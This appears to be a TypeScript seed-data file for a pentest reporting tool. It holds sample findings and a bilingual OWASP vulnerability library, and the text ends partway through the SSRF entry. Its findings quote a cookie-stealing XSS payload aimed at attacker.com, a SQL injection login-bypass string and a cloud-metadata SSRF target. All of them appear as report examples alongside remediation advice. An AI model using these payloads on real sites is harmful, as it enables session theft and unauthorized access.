

import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';
import { format } from 'date-fns';

export const clients: Client[] = [
  { id: 'cli-htb', name: 'Hack The Box', contact: 'contact@hackthebox.eu', logoUrl: 'https://picsum.photos/seed/htb/128/128' },
  { id: 'cli-ine', name: 'INE Security', contact: 'security@ine.com', logoUrl: 'https://picsum.photos/seed/ine/128/128' },
  { id: 'cli-offsec', name: 'Offsec', contact: 'audit@offsec.com', logoUrl: 'https://picsum.photos/seed/offsec/128/128' },
  { id: 'cli-h4ck', name: 'h4ckercademy', contact: 'contact@h4ckercademy.com', logoUrl: 'https://picsum.photos/seed/h4ckercademy/128/128' },
];

export const projects: Project[] = [
  { 
    id: 'proj-1', 
    clientId: 'cli-htb', 
    name: 'Q3 Web App Pentest', 
    reportBody: `## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.innovatech.com, api.innovatech.com
- **External Network:** 198.51.100.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

## Attack Narrative
The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-07-01', 
    endDate: '2023-07-15', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-07-01T10:00:00Z', 
    updatedAt: '2023-07-15T18:00:00Z', 
    icon: 'Scan' 
  },
  { 
    id: 'proj-2', 
    clientId: 'cli-ine', 
    name: 'Análisis de Red Interna', 
    reportBody: '', 
    startDate: '2023-08-10', 
    endDate: '2023-08-20', 
    status: 'In Progress', 
    language: 'es', 
    createdAt: '2023-08-10T09:00:00Z', 
    updatedAt: '2023-08-15T14:30:00Z', 
    icon: 'Network' 
  },
];

export const findings: Finding[] = [
  { 
    id: 'find-1', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-A03', 
    title: 'SQL Injection on Login Form', 
    severity: 'Critical', 
    cvss: 9.8, 
    markdown: `### Overview
A critical SQL Injection vulnerability was identified in the main login form of the application. This flaw allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application, potentially with administrative privileges.

---

### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

---

### Affected Components
- \`/auth/login\` endpoint
- User authentication module

---

### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full compromise of the application, data exfiltration, and further attacks against the underlying infrastructure.

---

### Recommendations
Implement parameterized queries (prepared statements) to handle all user-supplied input in database queries. This is the most effective way to prevent SQL Injection attacks. Validate and sanitize all user input on the server side as a defense-in-depth measure.`, 
    createdAt: '2023-07-05T11:00:00Z', 
    updatedAt: '2023-07-10T15:00:00Z' 
  },
  { 
    id: 'find-2', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-web-002', 
    title: 'Stored Cross-Site Scripting (XSS) in User Profile', 
    severity: 'High', 
    cvss: 8.0, 
    markdown: `### Overview
A stored XSS vulnerability exists in the user profile section, allowing an attacker to inject malicious scripts that execute in the browsers of other users, including administrators.

---

### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

---

### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

---

### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

---

### Recommendations
Implement context-aware output encoding for all user-supplied data before it is rendered in the browser. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.`, 
    createdAt: '2023-07-06T14:00:00Z', 
    updatedAt: '2023-07-11T10:00:00Z' 
  },
];

const emptyVulnBoilerplate = {
  remediation_en: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  remediation_es: { shortTerm: '[TODO]', mediumTerm: '[TODO]', longTerm: '[TODO]' },
  details_en: "[TODO: Provide a PoC, evidence, or detailed steps to reproduce the vulnerability.]",
  details_es: "[TODO: Proporcionar una PoC, evidencia o pasos detallados para reproducir la vulnerabilidad.]",
};

export const vulnerabilities: Vulnerability[] = [
    {
        id: "vuln-001",
        title_en: "SQL Injection",
        title_es: "Inyección SQL",
        cwe: "CWE-89",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Overview\nSQL Injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.",
        overview_es: "### Resumen\nLa inyección SQL es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación hace a su base de datos. Generalmente, permite a un atacante ver datos que normalmente no podría recuperar.",
        technicalDescription_en: "### Technical Description\nThe application concatenates user-supplied input with a SQL query without proper validation or sanitization. An attacker can provide a specially crafted input to manipulate the query structure.",
        technicalDescription_es: "### Descripción Técnica\nLa aplicación concatena la entrada proporcionada por el usuario con una consulta SQL sin la validación o desinfección adecuadas. Un atacante puede proporcionar una entrada especialmente diseñada para manipular la estructura de la consulta.",
        affectedComponents_en: "### Affected Components\n[TODO: Specify vulnerable parameters and endpoints, e.g., 'id' parameter in /products/view.php, login forms]",
        affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar parámetros y endpoints vulnerables, p. ej., parámetro 'id' en /products/view.php, formularios de inicio de sesión]",
        impact_en: "### Impact\nThis might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior, and in some cases, take control of the database server.",
        impact_es: "### Impacto\nEsto podría incluir datos pertenecientes a otros usuarios o cualquier otro dato al que la propia aplicación pueda acceder. En muchos casos, un atacante puede modificar o eliminar estos datos, provocando cambios persistentes en el contenido o el comportamiento de la aplicación, y en algunos casos, tomar el control del servidor de la base de datos.",
        recommendations_en: "### Recommendations\nUse parameterized queries (prepared statements) to prevent the interpreter from confusing data with code. Validate and sanitize all user input. Apply the principle of least privilege to the database user.",
        recommendations_es: "### Recomendaciones\nUtilizar consultas parametrizadas (sentencias preparadas) para evitar que el intérprete confunda los datos con el código. Validar y desinfectar todas las entradas del usuario. Aplicar el principio de privilegio mínimo al usuario de la base de datos.",
        references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
        tags: ["Web", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-002",
        title_en: "Cross-Site Scripting (XSS)",
        title_es: "Secuencias de Comandos en Sitios Cruzados (XSS)",
        cwe: "CWE-79",
        severity: "High",
        cvss: { score: 7.2, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Overview\nCross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.",
        overview_es: "### Resumen\nLos ataques de Cross-Site Scripting (XSS) son un tipo de inyección, en la que se inyectan scripts maliciosos en sitios web que de otro modo serían benignos y confiables. Los ataques XSS ocurren cuando un atacante utiliza una aplicación web para enviar código malicioso, generalmente en forma de un script del lado del navegador, a un usuario final diferente.",
        technicalDescription_en: "### Technical Description\nThe application includes user-supplied data in the response without proper escaping or sanitization. This allows an attacker to inject a script that will be executed in the victim's browser. It can be stored (persistent), reflected, or DOM-based.",
        technicalDescription_es: "### Descripción Técnica\nLa aplicación incluye datos proporcionados por el usuario en la respuesta sin el escape o la desinfección adecuados. Esto permite que un atacante inyecte un script que se ejecutará en el navegador de la víctima. Puede ser almacenado (persistente), reflejado o basado en DOM.",
        affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable field or parameter, e.g., search query, profile bio, comment section]",
        affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el campo o parámetro vulnerable, p. ej., consulta de búsqueda, biografía del perfil, sección de comentarios]",
        impact_en: "### Impact\nAn attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.",
        impact_es: "### Impacto\nUn atacante puede usar XSS para enviar un script malicioso a un usuario desprevenido. El navegador del usuario final no tiene forma de saber que no se debe confiar en el script y lo ejecutará. Debido a que cree que el script proviene de una fuente confiable, el script malicioso puede acceder a cualquier cookie, token de sesión u otra información confidencial retenida por el navegador y utilizada con ese sitio.",
        recommendations_en: "### Recommendations\nImplement context-aware output encoding. Use a modern web framework that provides built-in XSS protection. Implement a Content Security Policy (CSP) to mitigate the impact of any XSS that might still occur.",
        recommendations_es: "### Recomendaciones\nImplementar codificación de salida sensible al contexto. Utilizar un marco web moderno que proporcione protección XSS incorporada. Implementar una Política de Seguridad de Contenido (CSP) para mitigar el impacto de cualquier XSS que aún pueda ocurrir.",
        references: ["https://owasp.org/www-community/attacks/xss/"],
        tags: ["Web", "XSS"],
        ...emptyVulnBoilerplate
    },
    {
      id: "vuln-003",
      title_en: "Broken Authentication",
      title_es: "Autenticación Rota",
      cwe: "CWE-287",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nAuthentication and session management functions are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users' identities temporarily or permanently.",
      overview_es: "### Resumen\nLas funciones de autenticación y gestión de sesiones a menudo se implementan incorrectamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión, o explotar otros fallos de implementación para asumir las identidades de otros usuarios de forma temporal o permanente.",
      technicalDescription_en: "### Technical Description\nThe application's authentication mechanisms may be weak, allowing for vulnerabilities such as session hijacking, session fixation, insecure password storage, or predictable session identifiers. This can result from not invalidating session tokens upon logout or password change, or using weak credentials.",
      technicalDescription_es: "### Descripción Técnica\nLos mecanismos de autenticación de la aplicación pueden ser débiles, lo que permite vulnerabilidades como el secuestro de sesión, la fijación de sesión, el almacenamiento inseguro de contraseñas o identificadores de sesión predecibles. Esto puede ser el resultado de no invalidar los tokens de sesión al cerrar sesión o cambiar la contraseña, o usar credenciales débiles.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the affected components, e.g., login pages, session management system, password reset functionality.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar los componentes afectados, p. ej., páginas de inicio de sesión, sistema de gestión de sesiones, funcionalidad de restablecimiento de contraseña.]",
      impact_en: "### Impact\nAttackers can gain unauthorized access to user accounts, leading to data breaches, financial loss, and reputational damage. In some cases, they may be able to escalate privileges and compromise the entire system.",
      impact_es: "### Impacto\nLos atacantes pueden obtener acceso no autorizado a las cuentas de los usuarios, lo que conduce a violaciones de datos, pérdidas financieras y daños a la reputación. En algunos casos, pueden escalar privilegios y comprometer todo el sistema.",
      recommendations_en: "### Recommendations\nImplement strong password policies, multi-factor authentication (MFA), secure session management (e.g., using random, long session IDs), and invalidate sessions upon logout or password change. Use a secure method for password storage, such as bcrypt or Argon2.",
      recommendations_es: "### Recomendaciones\nImplementar políticas de contraseñas seguras, autenticación multifactor (MFA), gestión segura de sesiones (p. ej., utilizando ID de sesión largos y aleatorios) e invalidar las sesiones al cerrar sesión o cambiar la contraseña. Utilizar un método seguro para el almacenamiento de contraseñas, como bcrypt o Argon2.",
      references: ["https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication"],
      tags: ["Web", "Authentication"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-004",
      title_en: "Sensitive Data Exposure",
      title_es: "Exposición de Datos Sensibles",
      cwe: "CWE-312",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nMany web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.",
      overview_es: "### Resumen\nMuchas aplicaciones web y API no protegen adecuadamente los datos sensibles, como los financieros, de salud y la PII. Los atacantes pueden robar o modificar dichos datos débilmente protegidos para cometer fraudes con tarjetas de crédito, robos de identidad u otros delitos.",
      technicalDescription_en: "### Technical Description\nSensitive data may be transmitted in cleartext, stored in unencrypted databases, or leaked through error messages or verbose API responses. This can occur both at rest and in transit.",
      technicalDescription_es: "### Descripción Técnica\nLos datos sensibles pueden transmitirse en texto plano, almacenarse en bases de datos no cifradas o filtrarse a través de mensajes de error o respuestas de API detalladas. Esto puede ocurrir tanto en reposo como en tránsito.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify where sensitive data is exposed, e.g., API endpoints, database fields, client-side storage.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar dónde se exponen los datos sensibles, p. ej., endpoints de API, campos de la base de datos, almacenamiento del lado del cliente.]",
      impact_en: "### Impact\nExposure of sensitive data can lead to regulatory fines, reputational damage, and significant financial losses. Attackers can use this data for various malicious purposes, including identity theft and fraud.",
      impact_es: "### Impacto\nLa exposición de datos sensibles puede dar lugar a multas reglamentarias, daños a la reputación y pérdidas financieras significativas. Los atacantes pueden usar estos datos para diversos fines maliciosos, incluido el robo de identidad y el fraude.",
      recommendations_en: "### Recommendations\nEncrypt data at rest and in transit using strong, up-to-date cryptographic protocols (e.g., TLS 1.2/1.3). Avoid storing sensitive data unless absolutely necessary. Implement proper access controls to restrict access to sensitive information.",
      recommendations_es: "### Recomendaciones\nCifrar los datos en reposo y en tránsito utilizando protocolos criptográficos sólidos y actualizados (p. ej., TLS 1.2/1.3). Evitar almacenar datos sensibles a menos que sea absolutamente necesario. Implementar controles de acceso adecuados para restringir el acceso a la información sensible.",
      references: ["https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"],
      tags: ["Web", "Data"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-005",
      title_en: "XML External Entities (XXE)",
      title_es: "Entidades Externas XML (XXE)",
      cwe: "CWE-611",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nMany older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.",
      overview_es: "### Resumen\nMuchos procesadores XML antiguos o mal configurados evalúan las referencias a entidades externas dentro de los documentos XML. Las entidades externas se pueden usar para divulgar archivos internos utilizando el manejador de URI de archivo, recursos compartidos de archivos internos, escaneo de puertos internos, ejecución remota de código y ataques de denegación de servicio.",
      technicalDescription_en: "### Technical Description\nThe vulnerability occurs when an XML parser processes an XML document containing an external entity declaration. An attacker can craft a malicious XML payload that references sensitive local files or internal network resources.",
      technicalDescription_es: "### Descripción Técnica\nLa vulnerabilidad ocurre cuando un procesador XML procesa un documento XML que contiene una declaración de entidad externa. Un atacante puede crear una carga útil XML maliciosa que hace referencia a archivos locales sensibles o recursos de red internos.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that parses XML input, e.g., file upload features, API endpoints accepting XML.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que procesa la entrada XML, p. ej., funciones de carga de archivos, endpoints de API que aceptan XML.]",
      impact_en: "### Impact\nXXE can lead to the disclosure of sensitive data, server-side request forgery (SSRF), and denial of service (DoS). In some cases, it can enable remote code execution.",
      impact_es: "### Impacto\nXXE puede conducir a la divulgación de datos sensibles, la falsificación de solicitudes del lado del servidor (SSRF) y la denegación de servicio (DoS). En algunos casos, puede permitir la ejecución remota de código.",
      recommendations_en: "### Recommendations\nDisable external entity and DTD processing in all XML parsers. Use less complex data formats like JSON where possible. Implement input validation and sanitization.",
      recommendations_es: "### Recomendaciones\nDeshabilitar el procesamiento de entidades externas y DTD en todos los procesadores XML. Usar formatos de datos menos complejos como JSON siempre que sea posible. Implementar la validación y desinfección de entradas.",
      references: ["https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)"],
      tags: ["Web", "XXE"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-006",
      title_en: "Broken Access Control",
      title_es: "Control de Acceso Roto",
      cwe: "CWE-284",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nRestrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access other users' accounts, view sensitive files, modify other users' data, change access rights, etc.",
      overview_es: "### Resumen\nLas restricciones sobre lo que los usuarios autenticados pueden hacer a menudo no se aplican correctamente. Los atacantes pueden explotar estos fallos para acceder a las cuentas de otros usuarios, ver archivos sensibles, modificar los datos de otros usuarios, cambiar los derechos de acceso, etc.",
      technicalDescription_en: "### Technical Description\nAccess control is broken when an attacker can perform actions that should be restricted to users with higher privileges. This includes insecure direct object references (IDOR), privilege escalation, and path traversal vulnerabilities.",
      technicalDescription_es: "### Descripción Técnica\nEl control de acceso se rompe cuando un atacante puede realizar acciones que deberían estar restringidas a usuarios con privilegios más altos. Esto incluye referencias directas a objetos inseguras (IDOR), escalada de privilegios y vulnerabilidades de salto de directorio.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality with broken access control, e.g., API endpoints, administrative interfaces, file access mechanisms.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad con control de acceso roto, p. ej., endpoints de API, interfaces administrativas, mecanismos de acceso a archivos.]",
      impact_en: "### Impact\nAttackers can gain unauthorized access to sensitive information, perform administrative actions, and potentially compromise the entire application.",
      impact_es: "### Impacto\nLos atacantes pueden obtener acceso no autorizado a información sensible, realizar acciones administrativas y comprometer potencialmente toda la aplicación.",
      recommendations_en: "### Recommendations\nEnforce access control checks on the server-side for every request. Use a centralized access control mechanism. Deny by default and implement the principle of least privilege.",
      recommendations_es: "### Recomendaciones\nForzar las comprobaciones de control de acceso en el lado del servidor para cada solicitud. Utilizar un mecanismo de control de acceso centralizado. Denegar por defecto e implementar el principio de privilegio mínimo.",
      references: ["https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"],
      tags: ["Web", "Access Control"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-007",
      title_en: "Security Misconfiguration",
      title_es: "Configuración de Seguridad Incorrecta",
      cwe: "CWE-16",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nSecurity misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information.",
      overview_es: "### Resumen\nLa configuración de seguridad incorrecta es el problema más comúnmente visto. Esto es comúnmente el resultado de configuraciones predeterminadas inseguras, configuraciones incompletas o ad hoc, almacenamiento en la nube abierto, cabeceras HTTP mal configuradas y mensajes de error detallados que contienen información sensible.",
      technicalDescription_en: "### Technical Description\nThis vulnerability can arise from various sources, such as unnecessary features being enabled (e.g., default accounts, debug modes), missing security hardening, or permissive Cross-Origin Resource Sharing (CORS) policies.",
      technicalDescription_es: "### Descripción Técnica\nEsta vulnerabilidad puede surgir de varias fuentes, como características innecesarias habilitadas (p. ej., cuentas predeterminadas, modos de depuración), falta de fortalecimiento de la seguridad o políticas de Intercambio de Recursos de Origen Cruzado (CORS) permisivas.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the misconfigured component, e.g., application server, framework, cloud storage, HTTP headers.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el componente mal configurado, p. ej., servidor de aplicaciones, marco, almacenamiento en la nube, cabeceras HTTP.]",
      impact_en: "### Impact\nSecurity misconfigurations can lead to unauthorized access, data exposure, and full system compromise.",
      impact_es: "### Impacto\nLas configuraciones de seguridad incorrectas pueden conducir a acceso no autorizado, exposición de datos y compromiso total del sistema.",
      recommendations_en: "### Recommendations\nImplement a repeatable hardening process and secure configurations for all components. Use automated tools to verify configurations. Regularly patch and update all software.",
      recommendations_es: "### Recomendaciones\nImplementar un proceso de fortalecimiento repetible y configuraciones seguras para todos los componentes. Utilizar herramientas automatizadas para verificar las configuraciones. Parchear y actualizar regularmente todo el software.",
      references: ["https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"],
      tags: ["Web", "Configuration"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-008",
      title_en: "Cross-Site Request Forgery (CSRF)",
      title_es: "Falsificación de Solicitudes en Sitios Cruzados (CSRF)",
      cwe: "CWE-352",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nCSRF is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.",
      overview_es: "### Resumen\nCSRF es un ataque que obliga a un usuario final a ejecutar acciones no deseadas en una aplicación web en la que está autenticado actualmente. Los ataques CSRF se dirigen específicamente a solicitudes que cambian el estado, no al robo de datos, ya que el atacante no tiene forma de ver la respuesta a la solicitud falsificada.",
      technicalDescription_en: "### Technical Description\nThe application fails to validate that a state-changing request (e.g., changing a password, transferring funds) was intentionally submitted by the user. An attacker can create a malicious website that forges a request to the vulnerable application, which is then executed with the victim's credentials.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación no valida que una solicitud que cambia el estado (p. ej., cambiar una contraseña, transferir fondos) fue enviada intencionalmente por el usuario. Un atacante puede crear un sitio web malicioso que falsifica una solicitud a la aplicación vulnerable, la cual se ejecuta con las credenciales de la víctima.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the state-changing functionality lacking CSRF protection, e.g., password change form, fund transfer endpoint.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que cambia el estado y que carece de protección CSRF, p. ej., formulario de cambio de contraseña, endpoint de transferencia de fondos.]",
      impact_en: "### Impact\nAttackers can trick users into performing sensitive actions, such as changing their email address, password, or making a purchase, without their consent.",
      impact_es: "### Impacto\nLos atacantes pueden engañar a los usuarios para que realicen acciones sensibles, como cambiar su dirección de correo electrónico, contraseña o realizar una compra, sin su consentimiento.",
      recommendations_en: "### Recommendations\nImplement anti-CSRF tokens (synchronizer token pattern). Use the SameSite cookie attribute to prevent browsers from sending cookies with cross-site requests. Verify the Origin and Referer headers.",
      recommendations_es: "### Recomendaciones\nImplementar tokens anti-CSRF (patrón de token sincronizador). Usar el atributo de cookie SameSite para evitar que los navegadores envíen cookies con solicitudes entre sitios. Verificar las cabeceras Origin y Referer.",
      references: ["https://owasp.org/www-community/attacks/csrf"],
      tags: ["Web", "CSRF"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-009",
      title_en: "Insecure Deserialization",
      title_es: "Deserialización Insegura",
      cwe: "CWE-502",
      severity: "Critical",
      cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nInsecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.",
      overview_es: "### Resumen\nLa deserialización insegura a menudo conduce a la ejecución remota de código. Incluso si los fallos de deserialización no dan como resultado la ejecución remota de código, se pueden utilizar para realizar ataques, incluidos ataques de repetición, ataques de inyección y ataques de escalada de privilegios.",
      technicalDescription_en: "### Technical Description\nThe application deserializes untrusted user input without proper validation. An attacker can manipulate serialized objects to execute arbitrary code, bypass business logic, or cause a denial of service.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación deserializa la entrada del usuario no confiable sin la validación adecuada. Un atacante puede manipular objetos serializados para ejecutar código arbitrario, eludir la lógica de negocio o causar una denegación de servicio.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that deserializes user input, e.g., session cookies, API parameters, file uploads.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que deserializa la entrada del usuario, p. ej., cookies de sesión, parámetros de API, carga de archivos.]",
      impact_en: "### Impact\nThis vulnerability can lead to remote code execution, giving an attacker full control over the application server.",
      impact_es: "### Impacto\nEsta vulnerabilidad puede conducir a la ejecución remota de código, otorgando a un atacante el control total sobre el servidor de aplicaciones.",
      recommendations_en: "### Recommendations\nAvoid deserializing user-supplied data. If necessary, use a secure deserialization library and implement strict type constraints. Perform integrity checks on the serialized data.",
      recommendations_es: "### Recomendaciones\nEvitar la deserialización de datos proporcionados por el usuario. Si es necesario, usar una biblioteca de deserialización segura e implementar restricciones de tipo estrictas. Realizar comprobaciones de integridad en los datos serializados.",
      references: ["https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization"],
      tags: ["Web", "Deserialization"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-010",
      title_en: "Server-Side Request Forgery (SSRF)",
      title_es: "Falsificación de Solicitudes del Lado del Servidor (SSRF)",
      cwe: "CWE-918",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nSSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to a surprising destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).",
      overview_es: "### Resumen\nLos fallos de SSRF ocurren cada vez que una aplicación web obtiene un recurso remoto sin validar la URL proporcionada por el usuario. Permite a un atacante coaccionar a la aplicación para que envíe una solicitud diseñada a un destino sorprendente, incluso cuando está protegido por un cortafuegos, VPN u otro tipo de lista de control de acceso a la red (ACL).",
      technicalDescription_en: "### Technical Description\nThe application takes a URL as input and makes a request to it. An attacker can provide a URL pointing to an internal service or a local file (e.g., http://169.254.169.254/latest/meta-data/ to access cloud metadata).",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación toma una URL como entrada y realiza una solicitud a la misma. Un atacante puede proporcionar una URL que apunta a un servicio interno o un archivo local (p. ej., http://169.254.169.254/latest/meta-data/ para acceder a los metadatos de la nube).",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that fetches resources from a user-supplied URL, e.g., webhooks, PDF generators, image downloaders.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que obtiene recursos de una URL proporcionada por el usuario, p. ej., webhooks, generadores de PDF, descargadores de imágenes.]",
      impact_en: "### Impact\nSSRF can lead to port scanning of internal networks, information disclosure, and remote code execution if the application interacts with a vulnerable internal service.",
      impact_es: "### Impacto\nSSRF puede conducir al escaneo de puertos de redes internas, divulgación de información y ejecución remota de código si la aplicación interactúa con un servicio interno vulnerable.",
